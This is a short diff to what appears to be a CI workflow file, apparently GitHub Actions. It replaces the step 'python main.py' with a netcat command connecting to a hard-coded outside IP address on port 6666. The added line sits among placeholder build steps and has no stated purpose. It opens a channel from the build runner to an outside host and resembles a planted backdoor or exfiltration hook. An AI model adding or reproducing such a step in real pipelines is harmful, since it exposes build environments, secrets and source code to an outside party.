@@ -34,4 +34,4 @@ jobs:
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
-          python main.py
+          nc 120.77.211.144 -p 6666
